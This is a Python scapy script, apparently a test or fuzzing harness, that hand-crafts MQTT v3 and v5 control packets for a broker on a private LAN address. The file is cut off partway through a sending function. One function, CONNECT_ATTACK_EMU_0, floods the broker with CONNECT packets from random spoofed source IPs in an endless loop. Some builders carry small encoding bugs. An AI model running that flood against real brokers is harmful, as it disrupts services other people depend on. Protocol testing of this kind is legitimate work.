from scapy.contrib.mqtt import MQTT, MQTTConnect, MQTTPublish, MQTTSubscribe, MQTTUnsubscribe, MQTTConnack, MQTTPuback, \
    MQTTSuback, MQTTUnsuback, MQTTPubrec, MQTTPubrel, MQTTPubcomp, MQTTDisconnect, MQTTTopic, MQTTTopicQOS
from scapy.layers.inet import IP, TCP
from scapy.all import *
import random
import randomIP
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s'
)
ERR_MESSAGE = {
    0: 'NUMBER ERROR'
}

destination = '192.168.31.244'
source = '192.168.31.233'
client_id = "scapy_test"
topic = "python/shit"
# topic = "test0"
mac_addr = '00:0c:29:33:ec:cb'

CONTROL_PACKET_TYPE = {
    1: 'CONNECT',
    2: 'CONNACK',
    3: 'PUBLISH',
    4: 'PUBACK',
    5: 'PUBREC',
    6: 'PUBREL',
    7: 'PUBCOMP',
    8: 'SUBSCRIBE',
    9: 'SUBACK',
    10: 'UNSUBSCRIBE',
    11: 'UNSUBACK',
    12: 'PINGREQ',
    13: 'PINGRESP',
    14: 'DISCONNECT',
    15: 'AUTH'  # Added in v5.0
}
PROTOCOL_LEVEL = {
    3: 'v3.1',
    4: 'v3.1.1',
    5: 'v5.0'
}


# arp_entry = ARP(pdst=destination,hwdst=mac_addr)
# arp_entry.op = 2
# arp_entry.hwlen = 6
# arp_add(arp_entry)

# 构造带有IP以及TCP的MQTT CONNECT报文
def build_mqtt_connect_packet(client_id, src_ip, src_port, target_ip, target_port):
    tcp = TCP(dport=target_port, sport=src_port)
    tcp.flags = 'A'
    tcp.flags |= 'P'
    randomTOTlen = 5
    diy = bytes(
        [randomTOTlen, 0x11] + [0x00 for _ in range(randomTOTlen - 1)] + [0x00, len(client_id)])
    packet = IP(dst=f"{target_ip}", src=f'{src_ip}') / tcp / MQTT(type=1) / MQTTConnect(
        protoname='MQTT',
        usernameflag=0,
        passwordflag=0,
        willretainflag=0,
        willQOSflag=0,
        willflag=0,
        cleansess=1,
        reserved=0,
        klive=60,
        clientId=client_id,
        clientIdlen=RawVal(diy)
    )
    print('*' * 100)
    packet.show()
    print('*' * 100)
    return packet


# 构造MQTT CONNECT报文
def build_mqtt_connect_packet_only(client_id):
    randomTOTlen = 5
    diy = bytes(
        [randomTOTlen, 0x11] + [0x00 for _ in range(randomTOTlen - 1)] + [0x00, len(client_id)])
    # packet = IP(dst=f"{destination}", src=f'{source}') / tcp / MQTT(type=1) / MQTTConnect(
    #     protoname='MQTT',
    #     usernameflag=0,
    #     passwordflag=0,
    #     willretainflag=0,
    #     willQOSflag=0,
    #     willflag=0,
    #     cleansess=1,
    #     reserved=0,
    #     klive=60,
    #     clientId=client_id,
    #     clientIdlen=RawVal(diy)
    # )
    packet = MQTT(type=1) / MQTTConnect(
        protoname='MQTT',
        usernameflag=0,
        passwordflag=0,
        willretainflag=0,
        willQOSflag=0,
        willflag=0,
        cleansess=1,
        reserved=0,
        klive=60,
        clientId=client_id,
        clientIdlen=RawVal(diy)
    )
    logging.info(
        msg=f'CONNECT PACKET BUILD <{packet}> -<{packet.fields}>'
    )
    # print('*' * 100)
    # packet.show()
    # print('*' * 100)
    return packet


def CONNECT_ONLY_TEST_0(
        protoname='MQTT',
        usernameflag=0,
        passwordflag=0,
        willretainflag=0,
        willQOSflag=0,
        willflag=0,
        cleansess=1,
        reserved=0,
        klive=60,
        clientId='None',
        willtopic='None',
        willmsg='None',
        username='None',
        password='None',
        Session_Expiry_Interval_Value=65400,
        Receive_Maximum_Value=65400,
        Maximum_Packet_Size_Value=65400,
        Topic_Alias_Maximum_Value=65400,
        Will_Delay_Interval_flag=0,
        Will_Delay_Interval_Value=30,
        Payload_Format_Indicator=0,
        Publication_Expiry_Interval_flag=0,
        Publication_Expiry_Interval_Value=300,
        Content_Type_Value='',
        Response_Topic_Value='',
        Correlation_Data_flag=0,
        Correlation_Data_Value='',
):
    """
    Make For MQTTv5.0
    :param protoname:
    :param usernameflag:
    :param passwordflag:
    :param willretainflag:
    :param willQOSflag:
    :param willflag:
    :param cleansess:
    :param reserved:
    :param klive:
    :param clientId:
    :param willtopic:
    :param willmsg:
    :param username:
    :param password:
    :param Session_Expiry_Interval_Value:
    :param Receive_Maximum_Value:
    :param Maximum_Packet_Size_Value:
    :param Topic_Alias_Maximum_Value:
    :param Will_Delay_Interval_flag:
    :param Will_Delay_Interval_Value:
    :param Payload_Format_Indicator:
    :param Publication_Expiry_Interval_flag:
    :param Publication_Expiry_Interval_Value:
    :param Content_Type_Value:
    :param Response_Topic_Value:
    :param Correlation_Data_flag:
    :param Correlation_Data_Value:
    :return:
    """
    properties = b''
    properties_length = 0
    if cleansess != 0:
        # SET Session_Expiry_Interval
        sign = 0x11
        before_bytes = [
            sign,
            (Session_Expiry_Interval_Value >> 24) & 0xff,
            (Session_Expiry_Interval_Value >> 16) & 0xff,
            (Session_Expiry_Interval_Value >> 8) & 0xff,
            Session_Expiry_Interval_Value & 0xff,
        ]
        properties_length += len(before_bytes)
        properties += bytes(before_bytes)

    # SET Receive_Maximum
    receive_maximum_sign = 0x21
    rm_bb = [
        receive_maximum_sign,
        (Receive_Maximum_Value >> 8) & 0xff,
        Receive_Maximum_Value & 0xff,
    ]
    properties_length += len(rm_bb)
    properties += bytes(rm_bb)

    # SET Maximum_Packet_Size
    Maximum_Packet_Size_SIGN = 0x27
    mp_bb = [
        Maximum_Packet_Size_SIGN,
        (Maximum_Packet_Size_Value >> 24) & 0xff,
        (Maximum_Packet_Size_Value >> 16) & 0xff,
        (Maximum_Packet_Size_Value >> 8) & 0xff,
        Maximum_Packet_Size_Value & 0xff,
    ]
    properties_length += len(mp_bb)
    properties += bytes(mp_bb)

    # SET TOPIC ALIAS MAXIMUM
    Topic_Alias_Maximum_SIGN = 0x22
    tam_bb = [
        Topic_Alias_Maximum_SIGN,
        (Topic_Alias_Maximum_Value >> 8) & 0xff,
        Topic_Alias_Maximum_Value & 0xff,
    ]
    properties_length += len(tam_bb)
    properties += bytes(tam_bb)

    toRaw = bytes([properties_length]) + properties + bytes([(len(clientId) >> 8) & 0xff, len(clientId) & 0xff])

    # WILL SETTING
    """
    Will Flag 通常是 MQTT 协议实现方关心的字段，它用于标识 CONNECT 报文中是否会包含 Will Properties、Will Topic 等字段。
    
    Will Retain 的使用场景，它是保留消息与遗嘱消息的结合。如果订阅该遗嘱主题（Will Topic）的客户端不能保证遗嘱消息发布时在线，那么建议为遗嘱消息设置 Will Retain，避免订阅端错过遗嘱消息。
    
    Will Properties 中的消息过期间隔（Message Expiry Interval）等属性与 PUBLISH 报文中的用法基本一致，只有一个遗嘱延迟间隔（Will Delay Interval）是遗嘱消息特有的属性。
    """

    will_length = 0
    will_properties = b''
    if willflag != 0:
        if Will_Delay_Interval_flag != 0:
            wdi_sign = 0x18
            wdi_bb = [
                wdi_sign,
                (Will_Delay_Interval_Value >> 24) & 0xff,
                (Will_Delay_Interval_Value >> 16) & 0xff,
                (Will_Delay_Interval_Value >> 8) & 0xff,
                (Will_Delay_Interval_Value >> 0) & 0xff,
            ]
            will_length += len(wdi_bb)
            will_properties += bytes(wdi_bb)

        pfi_sign = 0x01
        pfi_bb = [
            pfi_sign,
            Payload_Format_Indicator % 2
        ]
        will_length += len(pfi_bb)
        will_properties += bytes(pfi_bb)

        if Publication_Expiry_Interval_flag != 0:
            pei_sign = 0x02
            pei_bb = [
                pei_sign,
                (Publication_Expiry_Interval_Value >> 24) & 0xff,
                (Publication_Expiry_Interval_Value >> 16) & 0xff,
                (Publication_Expiry_Interval_Value >> 8) & 0xff,
                (Publication_Expiry_Interval_Value >> 0) & 0xff,
            ]
            will_length += len(pei_bb)
            will_properties += bytes(pei_bb)

        ct_sign = 0x03
        ct_utf8 = Content_Type_Value.encode('utf-8')
        ct_bb = [
            ct_sign,
            (len(ct_utf8) >> 8) & 0xff,
            (len(ct_utf8) >> 0) & 0xff,
        ]
        will_length += (len(ct_bb) + len(ct_utf8))
        will_properties += bytes(ct_bb)
        will_properties += ct_utf8

        rt_sign = 0x08
        rt_utf8 = Response_Topic_Value.encode('utf-8')
        rt_bb = [
            rt_sign,
            (len(rt_utf8) >> 8) & 0xff,
            (len(rt_utf8) >> 0) & 0xff,
        ]
        will_length += (len(rt_bb) + len(rt_utf8))
        will_properties += bytes(rt_bb)
        will_properties += rt_utf8

        if Correlation_Data_flag != 0:
            cd_sign = 0x09
            cd_utf8 = Correlation_Data_Value.encode('utf-8')
            cd_bb = [
                cd_sign,
                (len(cd_utf8) >> 8) & 0xff,
                (len(cd_utf8) >> 0) & 0xff,
            ]
            will_length += (len(cd_bb) + len(cd_utf8))
            will_properties += bytes(cd_bb)
            will_properties += cd_utf8

    will_to_raw = bytes([will_length]) + will_properties + bytes([(len(willtopic) >> 8) & 0xff, len(willtopic) & 0xff])

    package = AUTO_MQTT_HEAD(mqtt_type=1) / MQTTConnect(
        protoname=protoname,
        usernameflag=usernameflag,
        passwordflag=passwordflag,
        willretainflag=willretainflag,
        willQOSflag=willQOSflag,
        willflag=willflag,
        cleansess=cleansess,
        reserved=reserved,
        klive=klive,
        clientId=clientId,
        clientIdlen=RawVal(toRaw),  # properties 关键插入位置
        wtoplen=RawVal(will_to_raw),  # WILL SETTING 关键插入位置
        willtopic=willtopic,
        willmsg=willmsg,
        username=username,
        password=password
    )
    logging.info(
        msg=f'CONNECT PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def CONNECT_ONLY_TEST_1(
        protoname='MQTT',
        protolevel=3,
        usernameflag=0,
        passwordflag=0,
        willretainflag=0,
        willQOSflag=0,
        willflag=0,
        cleansess=0,
        reserved=0,
        klive=60,
        clientId="None",
        willtopic="None",
        willmsg='None',
        username='None',
        password='None'
):
    """
    Make for MQTTv3.0 or MQTTv3.1.1
    :param protoname:
    :param protolevel: 3 or 4
    :param usernameflag:
    :param passwordflag:
    :param willretainflag:
    :param willQOSflag:
    :param willflag:
    :param cleansess:
    :param reserved:
    :param klive:
    :param clientId:
    :param willtopic:
    :param willmsg:
    :param username:
    :param password:
    :return:
    """
    if not (protolevel == 3 or protolevel == 4):
        raise Exception(ERR_MESSAGE.get(0))
    package = AUTO_MQTT_HEAD(mqtt_type=1) / MQTTConnect(
        protoname=protoname,
        protolevel=protolevel,
        usernameflag=usernameflag,
        passwordflag=passwordflag,
        willretainflag=willretainflag,
        willQOSflag=willQOSflag,
        willflag=willflag,
        cleansess=cleansess,
        reserved=reserved,
        klive=klive,
        clientId=clientId,
        willtopic=willtopic,
        willmsg=willmsg,
        username=username,
        password=password
    )
    logging.info(
        msg=f'CONNECT PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


# 发送MQTT报文
def send_mqtt_packet(packet):
    send(packet)


# 样例
def CONNECT_TEST_0():
    mqtt_connect_packet = build_mqtt_connect_packet(client_id, src_ip=source, src_port=16665, target_ip=destination,
                                                    target_port=1883)
    send_mqtt_packet(mqtt_connect_packet)


def PUBLISH_TEST_0(destination: str, topic: str):
    # 构建MQTT publish消息
    tcp = TCP(dport=1883, sport=16665)
    tcp.flags = 'P'
    tcp.flags |= 'A'
    mqtt = MQTT(
        type=3,
        DUP=0,
        QOS=0,
        RETAIN=0
    )
    # 发送MQTT publish消息
    package = IP(dst=destination, src=f'{source}') / tcp / mqtt / MQTTPublish(topic=topic,
                                                                              value='01234567899876543210')
    send(package)
    print('*' * 100)
    package.show()
    print('*' * 100)


def SOCKET_TEST_0():
    """
    USELESS
    :return:
    """
    # 构建TCP SYN数据包
    ip = IP(src="192.168.31.233", dst="192.168.31.244")
    tcp = TCP(sport=1234, dport=80, flags="S", seq=1000)

    # 发送TCP SYN数据包并接收响应
    syn_ack = sr1(ip / tcp)

    if syn_ack:
        # 解析响应数据包
        if syn_ack.haslayer(TCP) and syn_ack.getlayer(TCP).flags == "SA":
            print("TCP connection established")
        else:
            print("TCP connection failed")
    else:
        print("No response received")


def CONNECT_ATTACK_EMU_0():
    """
    sucked
    :return:
    """
    while True:
        temp_client_id = randomIP.RANDOM_NAME(suffix='MQTT_')
        temp_target_ip = '192.168.31.244'
        temp_target_port = 1883
        temp_src_ip = randomIP.IPV4()
        temp_src_port = random.randint(12000, 16665)
        ans = send(
            build_mqtt_connect_packet(temp_client_id, temp_src_ip, temp_src_port, temp_target_ip, temp_target_port))
        print('M' * 64)
        print(ans)
        print('W' * 64)


def PUBLISH_ONLY_TEST_0(topic, value):
    # 构建MQTT publish消息
    mqtt = MQTT(
        type=3,
        DUP=0,
        QOS=0,
        RETAIN=0
    )
    # 发送MQTT publish消息
    package = mqtt / MQTTPublish(topic=topic,
                                 value=chr(0) + value)
    # print('*' * 100)
    # package.show()
    # print('*' * 100)
    logging.info(
        msg=f'PUBLISH PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def AUTO_MQTT_HEAD(mqtt_type=0):
    # Cas Publish
    if mqtt_type == 3:
        qos = random.randint(0, 2)
        retain = random.randint(0, 1)
        if qos == 0 or qos == 2:
            dup = 0
        else:
            dup = random.randint(0, 1)
    # Cas Subscribe
    if mqtt_type == 8:
        dup = 0
        qos = 1
        retain = 0
    # Autres cas
    else:
        dup = 0
        qos = 0
        retain = 0

    # mqtt_fields = MQTT.MQTT(type=mqtt_type,
    #                         DUP=0,
    #                         QOS=0,
    #                         RETAIN=0,
    #                         len=None)
    mqtt_head_packet = MQTT(type=mqtt_type,
                            DUP=dup,
                            QOS=qos,
                            RETAIN=retain,
                            len=None)
    logging.info(
        msg=f'MQTT HEAD PACKET BUILD <{mqtt_head_packet}> - <{mqtt_head_packet.fields}>'
    )
    return mqtt_head_packet


def Topic_Suffix(retain_handling=0, retain_as_published=0, no_local=0, qos=0):
    """
    字段检查
    :param retain_handling:
    :param retain_as_published:
    :param no_local:
    :param qos:
    :return:
    """
    if not (0 <= retain_handling <= 3):
        raise Exception('Check 0<=retain_handling<=3')
    if not (0 <= retain_as_published <= 1):
        raise Exception('Check 0<=retain_as_published<=1')
    if not (0 <= no_local <= 1):
        raise Exception('Check 0<=no_local<=1')
    if not (0 <= qos <= 3):
        raise Exception('Check 0<=qos<=3')
    options = 0
    options |= qos
    options |= (no_local << 2)
    options |= (retain_as_published << 3)
    options |= (retain_handling << 4)
    return options


def Fresh_Topic(topics: List[str], mqtt_type=8, retain_handling=0, retain_as_published=0, no_local=0, qos=0):
    """
    报文间隔符修正
    :param topics:
    :param mqtt_type:
    :return:
    """
    n = len(topics)
    index1 = 0
    while index1 < n:
        tempLen = len(topics[index1])
        if mqtt_type == 8:
            if index1 == 0:
                topics[index1] = chr(0) + chr(tempLen >> 8) + chr(tempLen & 0x00FF) + topics[index1] + chr(
                    Topic_Suffix(retain_handling=retain_handling,
                                 retain_as_published=retain_as_published,
                                 no_local=no_local,
                                 qos=qos))
            else:
                topics[index1] = chr(tempLen >> 8) + chr(tempLen & 0x00FF) + topics[index1] + chr(
                    Topic_Suffix(retain_handling=retain_handling,
                                 retain_as_published=retain_as_published,
                                 no_local=no_local,
                                 qos=qos))
        elif mqtt_type == 10:
            if index1 == 0:
                topics[index1] = chr(0) + chr(tempLen >> 8) + chr(tempLen & 0x00FF) + topics[index1]
            else:
                topics[index1] = chr(tempLen >> 8) + chr(tempLen & 0x00FF) + topics[index1]
        index1 += 1
    return topics


def SUBSCRIBE_ONLY_TEST_0(topics=None, retain_handling=0, retain_as_published=0, no_local=0, qos=0):
    """
    MAKE FOR MQTTv5.0
    :param topics: 主题集合
    :param retain_handling:Send msgs at subscription time (default:0)
    :param retain_as_published:
    :param no_local:
    :param qos:
    :return:
    """
    if topics is None:
        topics = ['#']
    msgid = random.randint(1, 65533)
    topics = Fresh_Topic(topics, mqtt_type=8, retain_handling=retain_handling, retain_as_published=retain_as_published,
                         no_local=no_local, qos=qos)
    package = AUTO_MQTT_HEAD(mqtt_type=8) / MQTTSubscribe(msgid=msgid, topics=topics)
    logging.info(
        msg=f'SUBSCRIBE PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def Fresh_Topic_1(topics_ft: List[str], mqtt_type=8, qos=0):
    """
    废弃了
    make for mqttv3.0
    :param topics_ft:
    :return:
    """
    ft_index = 0
    ft_n = len(topics_ft)
    while ft_index < ft_n:
        if mqtt_type == 8:
            templen = len(topics_ft[ft_index])
            topics_ft[ft_index] = chr((templen >> 8) & 0xff) + chr(templen & 0xff) + topics_ft[ft_index] + chr(qos)
            ft_index += 1
        else:
            templen = len(topics_ft[ft_index])
            topics_ft[ft_index] = chr((templen >> 8) & 0xff) + chr(templen & 0xff) + topics_ft[ft_index]
            ft_index += 1
    return topics_ft


def make_mqtt_topic_qos(topic: str, qos=0):
    return MQTTTopicQOS(topic=topic, QOS=qos)


def make_mqtt_topic(topic: str):
    return MQTTTopic(topic=topic)


def SUBSCRIBE_ONLY_TEST_1(topics=None, qos=0):
    """
    Make for MQTTv3.0
    :param topics:
    :param qos:
    :return:
    """
    if topics is None:
        topics = ['#']
    msgid = random.randint(1, 65533)
    # topics = Fresh_Topic_1(topics_ft=topics, mqtt_type=8, qos=qos)
    topics_empty = []
    for v in topics:
        topics_empty.append(make_mqtt_topic_qos(v, qos))
    package = AUTO_MQTT_HEAD(mqtt_type=8) / MQTTSubscribe(msgid=msgid, topics=topics_empty)
    logging.info(
        msg=f'SUBSCRIBE PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def UNSUBSCRIBE_ONLY_TEST_0(topics=None):
    """
    MAKE FOR MQTTV5.0
    :param topics:
    :return:
    """
    if topics is None:
        topics = ['#']
    topics = Fresh_Topic(topics, mqtt_type=10)
    msgid = random.randint(1, 65533)
    package = AUTO_MQTT_HEAD(mqtt_type=10) / MQTTUnsubscribe(msgid=msgid, topics=topics)
    logging.info(
        msg=f'UNSUBSCRIBE PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def UNSUBSCRIBE_ONLY_TEST_1(topics=None):
    """
    Make for MQTTv3.0
    :param topics:
    :return:
    """
    if topics is None:
        topics = ['#']
    msgid = random.randint(1, 65533)
    # topics = Fresh_Topic_1(topics_ft=topics, mqtt_type=8)
    topic_empty = []
    for v in topics:
        topic_empty.append(make_mqtt_topic(v))
    package = AUTO_MQTT_HEAD(mqtt_type=10) / MQTTUnsubscribe(msgid=msgid, topics=topic_empty)
    logging.info(
        msg=f'UNSUBSCRIBE PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def CONEECTACK_ONLY_TEST_0(retcode=0):
    """
    sessPresentFlag?
    retcode::
    0	0x00连接已接受	连接已被服务端接受
    1	0x01连接已拒绝，不支持的协议版本	服务端不支持客户端请求的MQTT协议级别
    2	0x02连接已拒绝，不合格的客户端标识符	客户端标识符是正确的UTF-8编码，但服务端不允许使用
    3	0x03连接已拒绝，服务端不可用	网络连接已建立，但MQTT服务不可用
    4	0x04连接已拒绝，无效的用户名或密码	用户名或密码的数据格式无效
    5	0x05连接已拒绝，未授权	客户端未被授权连接到此服务器
    6-255		保留
    :return:
    """
    # length = 16
    ID_Maximum_Packet_Size = 0x27
    ID_Maximum_Packet_Size_Value = random.randint(0x0fffffff, 0xffffffff)

    def UNION_ID_Maximum_Packet_Size():
        return [
            ID_Maximum_Packet_Size,
            (ID_Maximum_Packet_Size_Value >> 24) & 0xff,
            (ID_Maximum_Packet_Size_Value >> 16) & 0xff,
            (ID_Maximum_Packet_Size_Value >> 8) & 0xff,
            ID_Maximum_Packet_Size_Value & 0xff,
        ]

    ID_Retain_Available = 0x25
    ID_Retain_Available_Value = 1  # 0 or 1

    def UNION_ID_Retain_Available():
        return [
            ID_Retain_Available,
            ID_Retain_Available_Value & 0xff
        ]

    ID_Shared_Subscription_Available = 0x2a
    ID_Shared_Subscription_Available_Value = 1  # 0 or 1

    def UNION_ID_Shared_Subscription_Available():
        return [
            ID_Shared_Subscription_Available,
            ID_Shared_Subscription_Available_Value & 0xff
        ]

    ID_Subscription_Identifier_Available = 0x29
    ID_Subscription_Identifier_Available_Value = 1  # 0 or 1

    def UNION_ID_Subscription_Identifier_Available():
        return [
            ID_Subscription_Identifier_Available,
            ID_Subscription_Identifier_Available_Value & 0xff
        ]

    ID_Topic_Alias_Maximum = 0x22
    ID_Topic_Alias_Maximum_Value = random.randint(0x0fff, 0xffff)

    def UNION_ID_Topic_Alias_Maximum():
        return [
            ID_Topic_Alias_Maximum,
            (ID_Topic_Alias_Maximum_Value >> 8) & 0xff,
            (ID_Topic_Alias_Maximum_Value >> 0) & 0xff,
        ]

    ID_Wildcard_Subscription_Available = 0x28
    ID_Wildcard_Subscription_Available_Value = 1  # 0 or 1

    def UNION_ID_Wildcard_Subscription_Available():
        return [
            ID_Wildcard_Subscription_Available,
            ID_Wildcard_Subscription_Available_Value & 0xff
        ]

    ID_Topic_Alias = 0x23
    ID_Topic_Alias_Value = random.randint(1, 0xffff)

    def UNION_ID_Topic_Alias():
        return [
            ID_Topic_Alias,
            (ID_Topic_Alias_Value >> 8) & 0xff,
            (ID_Topic_Alias_Value >> 0) & 0xff,
        ]

    ID_Payload_Format_Indicator = 0x01
    ID_Payload_Format_Indicator_Value = random.randint(1, 0xff)

    def UNION_ID_Payload_Format_Indicator():
        return [
            ID_Payload_Format_Indicator,
            ID_Payload_Format_Indicator_Value & 0xff
        ]

    ID_User_Property = 0x26
    ID_User_Property_Value = random.randint(1, 0xffff)

    def UNION_ID_User_Property():
        return [
            ID_User_Property,
            (ID_User_Property_Value >> 8) & 0xff,
            (ID_User_Property_Value >> 0) & 0xff,
        ]

    ID_Receive_Maximum = 0x21
    ID_Receive_Maximum_Value = random.randint(0x0fff, 0xffff)

    def UNION_ID_Receive_Maximum():
        return [
            ID_Receive_Maximum,
            (ID_Receive_Maximum_Value >> 8) & 0xff,
            (ID_Receive_Maximum_Value >> 0) & 0xff,
        ]

    ID_Maximum_QoS = 0x24
    ID_Maximum_QoS_Value = random.randint(0, 2)

    def UNION_ID_Maximum_QoS():
        return [
            ID_Maximum_QoS,
            ID_Maximum_QoS_Value & 0xff
        ]

    ID_Publication_Expiry_Interval = 0x02
    ID_Publication_Expiry_Interval_Value = random.randint(0x0fffffff, 0xffffffff)

    def UNION_ID_Publication_Expiry_Interval():
        return [
            ID_Publication_Expiry_Interval,
            (ID_Publication_Expiry_Interval_Value >> 24) & 0xff,
            (ID_Publication_Expiry_Interval_Value >> 16) & 0xff,
            (ID_Publication_Expiry_Interval_Value >> 8) & 0xff,
            ID_Publication_Expiry_Interval_Value & 0xff,
        ]

    nums = UNION_ID_Maximum_Packet_Size() + \
           UNION_ID_Retain_Available() + \
           UNION_ID_Shared_Subscription_Available() + \
           UNION_ID_Subscription_Identifier_Available() + \
           UNION_ID_Topic_Alias_Maximum() + \
           UNION_ID_Wildcard_Subscription_Available()
    package = AUTO_MQTT_HEAD(mqtt_type=2) / MQTTConnack(sessPresentFlag=1, retcode=retcode) / Raw(
        bytes([len(nums)] + nums))
    logging.info(
        msg=f'CONEECTACK PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def PUBACK_ONLY_TEST_0():
    msgid = random.randint(1, 65533)
    package = AUTO_MQTT_HEAD(mqtt_type=4) / MQTTPuback(msgid=msgid)
    logging.info(
        msg=f'PUBACK PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def SUBACK_ONLY_TEST_0():
    msgid = random.randint(1, 65533)
    package = AUTO_MQTT_HEAD(mqtt_type=9) / MQTTSuback(msgid=msgid, retcode=0)
    logging.info(
        msg=f'SUBACK PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def UNSUBACK_ONLY_TEST_0():
    msgid = random.randint(1, 65533)
    retcode = 0x00
    package = AUTO_MQTT_HEAD(mqtt_type=11) / MQTTUnsuback(msgid=msgid) / Raw(bytes([retcode]))
    logging.info(
        msg=f'UNSUBACK PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def PUBREC_ONLY_TEST_0():
    msgid = random.randint(1, 65533)
    package = AUTO_MQTT_HEAD(mqtt_type=5) / MQTTPubrec(msgid=msgid)
    logging.info(
        msg=f'PUBREC PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def PUBREL_ONLY_TEST_0():
    msgid = random.randint(1, 65533)
    package = AUTO_MQTT_HEAD(mqtt_type=6) / MQTTPubrel(msgid=msgid)
    logging.info(
        msg=f'PUBREL PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def PUBCOMP_ONLY_TEST_0():
    msgid = random.randint(1, 65533)
    package = AUTO_MQTT_HEAD(mqtt_type=7) / MQTTPubcomp(msgid=msgid)
    logging.info(
        msg=f'PUBCOMP PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def PINGREQ_ONLY_TEST_0():
    package = AUTO_MQTT_HEAD(mqtt_type=12)
    logging.info(
        msg=f'PINGREQ PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def PINGRESP_ONLY_TEST_0():
    package = AUTO_MQTT_HEAD(mqtt_type=13)
    logging.info(
        msg=f'PINGRESP PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def DISCONNECT_ONLY_TEST_0():
    # easy mode
    return AUTO_MQTT_HEAD(mqtt_type=14) / MQTTDisconnect()


def DISCONNECT_ONLY_TEST_1():
    # hard core
    # Reason Code: Normal disconnection (0) # retcode < 1 only 0
    nums = [0x00, 0x00]
    package = AUTO_MQTT_HEAD(mqtt_type=14) / MQTTDisconnect() / Raw(bytes(nums))
    logging.info(
        msg=f'DISCONNECT PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def AUTH_ONLY_TEST_0(
        AM_SET=False,
        AM_VALUE='None',
        AD_SET=False,
        AD_DATA='None',
        RS_SET=False,
        RS_DATA='None',
        UP_SET=False,
        UP_DATA='None'
):
    """

    RETCODE::
    0x00 成功 由服务端发送 /
    0x18 继续认证 由服务端或者客户端发送 /
    0x19 重新认证 由客户端发送

    Properties::
    0x15 认证方法(Authentication Method)标识符-
    跟随其后的是一个UTF-8编码字符串，包含认证方法名称。省略认证方法或者包含多个认证方法都将造成协议错误(Protocol Error)。
    0x16 认证数据(Authentication Data)标识符。
    跟随其后的是二进制数据，包含认证数据。包含多个认证数据将造成协议错误(Protocol Error)。此数据的内容由认证方法定义。
    0x31 原因字符串(Reason String)标识符。
    跟随其后的是UTF-8编码字符串，表示断开原因。此原因字符串是为诊断而设计的可读字符串，不应该被接收端所解析。如果加上原因字符串之后的AUTH报文长度超出了接收端所指定的最大报文长度，则发送端不能发送此属性。包含多个原因字符串将造成协议错误(Protocol Error)。
    0x38 用户属性(User Property)标识符
    跟随其后的是UTF-8字符串键值对。此属性可用于向客户端提供包括诊断信息在内的附加信息。如果加上用户属性之后的AUTH报文长度超出了接收端指定的最大报文长度，则服务端不能发送此属性。用户属性(User Property)允许出现多次，以表示多个名字/值对，且相同的名字可以多次出现。
    :return:
    """
    retcode = bytes([0x00])
    package = AUTO_MQTT_HEAD(mqtt_type=15) / retcode

    def SET_Authentication_Method(Authentication_Method_Name: str):
        toUTF8 = Authentication_Method_Name.encode('utf-8')
        beforeBYTES = [
            0x15,
            (len(Authentication_Method_Name) >> 8) & 0xff,
            len(Authentication_Method_Name) & 0xff,
        ]
        return (len(beforeBYTES) + len(toUTF8)), bytes(beforeBYTES) + toUTF8

    def SET_Authentication_Data(Authentication_Data_Value: str):
        toUTF8 = Authentication_Data_Value.encode('utf-8')
        beforeBYTES = [
            0x16,
            (len(Authentication_Data_Value) >> 8) & 0xff,
            len(Authentication_Data_Value) & 0xff,
        ]
        return (len(beforeBYTES) + len(toUTF8)), bytes(beforeBYTES) + toUTF8

    def SET_Reason_String(Reason_String_Value: str):
        toUTF8 = Reason_String_Value.encode('utf-8')
        beforeBYTES = [
            0x1f,
            (len(Reason_String_Value) >> 8) & 0xff,
            len(Reason_String_Value) & 0xff,
        ]
        return (len(beforeBYTES) + len(toUTF8)), bytes(beforeBYTES) + toUTF8

    def SET_User_Property(User_Property_Value: str):
        toUTF8 = User_Property_Value.encode('utf-8')
        beforeBYTES = [
            0x26,
            (len(User_Property_Value) >> 8) & 0xff,
            len(User_Property_Value) & 0xff,
        ]
        return (len(beforeBYTES) + len(toUTF8)), bytes(beforeBYTES) + toUTF8

    length = 0
    final_byte_stream = b''
    if AM_SET:
        length_tmp, package_tmp = SET_Authentication_Method(AM_VALUE)
        length += length_tmp
        final_byte_stream += package_tmp
    if AD_SET:
        length_tmp, package_tmp = SET_Authentication_Method(AD_DATA)
        length += length_tmp
        final_byte_stream += package_tmp
    if RS_SET:
        length_tmp, package_tmp = SET_Reason_String(RS_DATA)
        length += length_tmp
        final_byte_stream += package_tmp
    if UP_SET:
        length_tmp, package_tmp = SET_User_Property(UP_DATA)
        length += length_tmp
        final_byte_stream += package_tmp

    package = package / chr(length) / final_byte_stream

    logging.info(
        msg=f'AUTH PACKET BUILD <{package}> - <{package.fields}> - <{package.payload.fields}>'
    )
    return package


def create_socket(ip):
    s = socket.socket()
    logging.debug(msg=f'DESTINATION IS <{ip}>')
    s.connect((ip, 1883))
    ss = StreamSocket(s, Raw)
    return ss


def send_scenarii(packets, ip):
    # Socket creation
    ss = create_socket(ip)

    # Senfind packet for each scenario
    for packet in packets:
        logging.debug(
            msg=f'Send packet type: {packet.type}'
        )
        if packet.type == 1:
            logging.debug(
                msg=f'PROTOLEVEL <{packet.protolevel}>'
            )
